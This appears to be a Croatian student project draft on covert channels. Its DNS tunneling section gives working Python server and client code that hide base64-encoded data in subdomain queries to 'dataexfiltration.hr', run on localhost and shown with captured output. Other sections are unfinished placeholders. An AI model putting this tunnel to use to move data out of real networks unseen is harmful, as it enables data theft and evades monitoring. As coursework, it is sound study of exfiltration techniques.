# Uvod




# 1. Metode i tehnike rada









# 2. DNS Tunneling - Donat Ricov

# 2.1. Plan izrade praktičnog dijela

Tekst

## 2.2. Metode i tehnike rada

Tekst 

## 2.3. Postavljanje radnog okruženja

Tekst

## 2.4. Kod

### 2.4.1. Poslužitelj - dns_server.py

import socket
import base64
from dnslib import DNSRecord, DNSHeader, RR, QTYPE, A

def extract_message_from_subdomain(subdomain):
    try:
        return base64.urlsafe_b64decode(subdomain.encode()).decode()
    except Exception as error:
        return f"Error decoding message: {error}"

def process_dns_query(query_data, client_ip):
    parsed_query = DNSRecord.parse(query_data)
    response_record = DNSRecord(DNSHeader(id=parsed_query.header.id, qr=1, aa=1, ra=1), q=parsed_query.q)
    requested_domain = str(parsed_query.q.qname)
    print(f"Received DNS request for: {requested_domain} from {client_ip}")

    if "dataexfiltration.hr" in requested_domain:
        domain_parts = requested_domain.split('.')
        if len(domain_parts) > 2:
            secret_part = domain_parts[0]
            decoded_message = extract_message_from_subdomain(secret_part)
            print(f"Decoded secret: {decoded_message}")
        
        ip_address = "127.0.0.1"
        response_record.add_answer(RR(requested_domain, QTYPE.A, rdata=A(ip_address), ttl=300))
        print(f"Responding with IP: {ip_address}")
    else:
        print(f"Invalid domain query for: {requested_domain}")
    
    return response_record.pack()

def run_dns_server(bind_address="0.0.0.0", bind_port=5354):
    print(f"DNS server is running on {bind_address}:{bind_port}")
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as server_socket:
        server_socket.bind((bind_address, bind_port))
        while True:
            try:
                query_data, client_address = server_socket.recvfrom(512)
                response_data = process_dns_query(query_data, client_address)
                server_socket.sendto(response_data, client_address)
            except Exception as e:
                print(f"Error during query processing: {e}")

if __name__ == "__main__":
    try:
        run_dns_server()
    except KeyboardInterrupt:
        print("\nDNS server stopped.")

## 2.4.2. Klijent - client.py

import dns.message
import dns.query
import base64

def encode_data_in_subdomain(data, domain):
    encoded = base64.urlsafe_b64encode(data.encode()).decode()
    return f"{encoded}.{domain}"

def transmit_dns_tunnel_message(server, domain, message, port=53):
    query_domain = encode_data_in_subdomain(message, domain)
    query = dns.message.make_query(query_domain, dns.rdatatype.A)
    try:
        response = dns.query.udp(query, server, port=port)
        print(f"Message sent: '{message}' as '{query_domain}'")
        print(f"Response:\n{response}")
    except Exception as e:
        print(f"Transmission failed: {e}")

if __name__ == "__main__":
    domain = "dataexfiltration.hr"
    server_ip = "127.0.0.1"
    server_port = 5354

    msg = "Ova poruka je tajna."

    transmit_dns_tunnel_message(server_ip, domain, msg, port=server_port)

## 2.5. Slanje poruke i snimanje prometa

### 2.5.1. tcmdump

Snimio sam pakete koji idu na portu 5354.

sudo tcpdump -i lo udp port 5354 -w dns_tunnel.pcap

Objasnjenje

### 2.5.2. Pokretanje DNS servera

Otvorio sam drugi terminal i u njemu pokrenuo

cd dns_tunnel
python3 dns_server.py

I dobio poruku:

Starting DNS server on 0.0.0.0:5354

### 2.5.3. Pokretanje klijenta i slanje poruke

Otvorio sam treći terminal i pokrenuo:

cd dns_tunnel
python3 client.py

Što je ispisalo:

donat@donat-VirtualBox:~$ cd dns_tunnel
python3 client.py
Message sent: 'Ova poruka je tajna.' as 'T3ZhIHBvcnVrYSBqZSB0YWpuYS4=.dataexfiltration.hr'
Response:
id 64216
opcode QUERY
rcode NOERROR
flags QR AA RD RA
;QUESTION
T3ZhIHBvcnVrYSBqZSB0YWpuYS4=.dataexfiltration.hr. IN A
;ANSWER
T3ZhIHBvcnVrYSBqZSB0YWpuYS4=.dataexfiltration.hr. 300 IN A 127.0.0.1
;AUTHORITY
;ADDITIONAL

### 2.5.3. Čitanje tajne poruke

donat@donat-VirtualBox:~/dns_tunnel$ python3 dns_server.py
DNS server is running on 0.0.0.0:5354
Received DNS request for: T3ZhIHBvcnVrYSBqZSB0YWpuYS4=.dataexfiltration.hr. from ('127.0.0.1', 41631)
Decoded secret: Ova poruka je tajna.
Responding with IP: 127.0.0.1

### 2.5.4. Zaustavljanje tcpdump-a

Kada sam zaustavio tcpdump dobio sam 

^C2 packets captured
4 packets received by filter
0 packets dropped by kernel
donat@donat-VirtualBox:~$ ^C

Te sam dobio datoteku dns_tunnel.pcap.

### 2.6. Analiza prometa u Wiresharku









































## 2.2. Steganografija - Lana Maček

## 2.3. Covert timing channels - Marin Vabec

## 2.4. SMTP - Dino Primorac
